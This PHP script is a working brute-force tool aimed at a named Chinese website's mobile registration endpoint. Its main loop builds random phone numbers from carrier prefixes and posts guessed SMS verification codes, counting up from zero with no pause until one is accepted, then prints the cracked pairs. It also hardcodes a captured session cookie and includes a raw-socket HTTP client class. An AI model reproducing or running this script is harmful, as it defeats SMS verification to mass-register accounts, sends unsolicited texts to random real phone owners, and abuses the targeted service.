<?php 

$url = "http://www.trjcn.com/api/mobile_regcode_send";

$http_client = new StreamHttpClient($url);
// $result = $http_client->get($params);
// echo $result;

$arr_mobile = array(
    133,153,180,181,189,
    130,131,132,145,155,156,185,186,
    134,135,136,137,138,139,147,150,151,152,157,158,159,182,183,184,187,188
);

$c = count($arr_mobile);

while(1){
    $params = array(
        "mobile" => $arr_mobile[rand(0, $c-1)].rand(10000000, 99999999),
        "mobilecaptcha" => 0,
        "_t" => 20150723
    );
    
    $k = rand(1000000000, 9999999999);
    $h2= new StreamHttpClient("http://www.trjcn.com/util/captcha_page.html?0.62117".$k);
    $h2->get();
    
    while(1){
        $result = $http_client->post($params);
        //echo $result."\n";
        $result = json_decode($result, true);
        if($result["code"] != 200){
            $params["mobilecaptcha"]++;
        }else{
            echo json_encode($params)." ".json_encode($result)."\n";
            break;
        }
        //sleep(1);
    }
    //sleep(1);
}


/**
 *
 * @author liyunfei
 * @version 1.0
 * @desc this class support http long connect
 */

class StreamHttpClient
{
    private $port       = 80;
    private $timeout    = 1;
    private $length     = 8196;
    private $url;
    private $user_agent = "your agent";
    public  $http_code;
    public  $header;//header infomation

    public function __construct($url){
        $this->url = parse_url($url);
    }

    public function get($params = array()){
        $query = (isset($this->url['query']) ? $this->url['query']."&" : "?") . http_build_query($params);
        $context  = "GET ".$this->url['path'].$query." HTTP/1.1\r\n";
        $context .= $this->build_header();
        $context .= "\r\n";

        $response = $this->request($context);
        $result = $this->parse($response);
        return $result;
    }

    public function post($params = array()){
        $data = http_build_query($params);
        $query = isset($this->url['query']) ? $this->url['query'] : '';
        $context  = "POST ".$this->url['path'].$query." HTTP/1.1\r\n";
        $context .= $this->build_header();
        $context .= "Content-Length: ".strlen($data)."\r\n\r\n";

        if(strlen($data) > 0){
            $context .= $data."\r\n\r\n";
        }
        //echo $context;
        $response = $this->request($context);
        $result = $this->parse($response);
        return $result;
    }

    public function build_header(){
        $context  = "";
        if($this->header){
            $context = implode("\r\n", $this->header)."\r\n";
        }
        if(!isset($this->header["Accept"])) {
            $context .= "Accept:application/json, text/javascript, */*; q=0.01\r\n";
        }
        //$context .= "Accept-Encoding:gzip, deflate\r\n";
        $context .= "Accept-Language:zh-CN,zh;q=0.8\r\n";
        
        $context .= "Host: ".$this->url['host']."\r\n";
        if(!isset($this->header["User-Agent"])) {
            $context .= "User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\r\n";
        }
        if(!isset($this->header["Content-Type"])) {
            $context .= "Content-Type: application/x-www-form-urlencoded\r\n";
        }
        if(!isset($this->header["Connection"])) {
            $context .= "Connection: Keep-Alive\r\n";
        }
        
        $context .= "Cookie:a5399_times=3; bdshare_firstime=1490776166477; qs_lvt_10046=1486621451%2C1489382636%2C1490772481%2C1490776166%2C1493106288; qs_pv_10046=1463886563608786400%2C592738566410098400%2C1838139540330200000%2C2325365833514436600%2C600450122204416900; __cfduid=dc2db495cd4040699e22a135b5e707d9b1496649724; PHPSESSID=n855enk037us4pda4l577grs66; TRJ_track_channel=zt%3Abusiness_plan; TRJ_trackid=ads%3Appzq1%7CT%7Chttp%253A%252F%252Fbzclk.baidu.com%252Fadrc.php%253Ft%253D06KL00c00f7xWwb0FAky0aOFNsK55dqu000002OEYj300000XLYplW.THLPV_WpEXT0UWdBmy-bIy9EUyNxTAT0T1d-mW9Brj0LuW0snj0kuhFh0ZRqwWIKfHn3PHcLfYFjrjc1wbckfWmknHw7wRfdwDDvwWD0mHdL5iuVmv-b5Hc4njmdnjb1PWnhTZFEuA-b5HDv0ARqpZwYTjCEQLILIz4YThGWUB4WUvYE5LwzmyPopyfqmyw1rMKsXMDk0APzm1YzP1c3Pf%2526amp%253Btpl%253Dtpl_10087_15653_1%2526amp%253Bl%253D1053880239%2526amp%253Battach%253Dlocation%253D%2526li_nkName%253D%2525E6%2525A0%252587%2525E9%2525A2%252598%2526li_nkText%253D%2525E6%25258A%252595%2525E8%25259E%25258D%2525E7%252595%25258C%2525E5%2525AE%252598%2525E6%252596%2525B9%2525E7%2525BD%252591%2525E7%2525AB%252599-%2525E4%2525B8%252593%2525E4%2525B8%25259A%2525E7%25259A%252584%2525E8%25259E%25258D%2525E8%2525B5%252584%2525E6%25259C%25258D%2525E5%25258A%2525A1%2525E5%2525B9%2525B3%2526xp%253Did%2528%252522m4861548a%252522%2529%25252FDIV%25255B1%25255D%25252FDIV%25255B1%25255D%25252FDIV%25255B1%25255D%25252FH2%25255B1%25255D%25252FA%25255B1%25255D%2526li_nkType%253D%2526checksum%253D244%2526amp%253Bwd%253D%25E6%258A%2595%25E8%259E%258D%25E7%2595%258C%2526amp%253Bissp%253D1%2526amp%253Bf%253D8%2526amp%253Bie%253Dutf-8%2526amp%253Brqlang%253Dcn%2526amp%253Btn%253Dbaiduhome_pg%2526amp%253Boq%253Dphp%252520%252526gt%25253BG%2526amp%253BinputT%253D778%2526amp%253Bbs%253Dphp%2BEG; Hm_lvt_c0573ae297ae181de08c62139538357e=1499414355; Hm_lpvt_c0573ae297ae181de08c62139538357e=1499416642\r\n";
        
        $context .= "Host:www.trjcn.com\r\n";
        $context .= "Origin:http://www.trjcn.com\r\n";
        $context .= "Referer:http://www.trjcn.com/\r\n";
        
        $context .= "X-Requested-With: XMLHttpRequest\r\n";
        return $context;
    }

    /**
     * send http request
     * @param unknown $context
     */
    public function request($context){
        $fp = stream_socket_client("tcp://".$this->url['host'].":".$this->port, $errno, $errstr, $this->timeout, STREAM_CLIENT_CONNECT | STREAM_CLIENT_PERSISTENT);
        //send context to server
        fwrite($fp, $context);
        //read server response
        $response = fread($fp, $this->length);
        //Transfer-Encoding: chunked
        if(strpos($response, "Transfer-Encoding: chunked") > 0){
            $chunked = true;
        }else{
            $chunked = false;
        }
        while (!feof($fp)){
            if($chunked){
                if(substr($response, -5) == "0\r\n\r\n"){
                    break;
                }
            }else{//Content-Length
                if (strlen($response) % $this->length){
                    break;
                }
            }
            $response .= fread($fp, $this->length);
        }
        //when service close Connection
        if(strpos("Connection: close", $response)){
            fclose($fp);
        }

        return $response;
    }

    public function print_string($string){
        for($i = 0; $i < strlen($string); $i++){
            $c = $string[$i];
            switch ($c){
                case "\f":
                    echo "\\f";
                    break;
                case "\n":
                    echo "\\n";
                    break;
                case "\r":
                    echo "\\r";
                    break;
                case "\t":
                    echo "\\t";
                    break;
                case "\v":
                    echo "\\v";
                    break;
                default :
                    echo $c;
                    break;
            }
        }
    }

    public function parse($response){
        $response = explode("\r\n\r\n", $response);

        $header = $response[0];
        $this->http_code = substr($header, 9, 3);

        $package = explode("\r\n", $response[1]);
        $data = "";
        for($i = 0; $i < count($package); $i+=2){
            if(hexdec($package[$i]) > 0){
                $data .= $package[$i+1];
            }
        }

        return $data;
    }

}
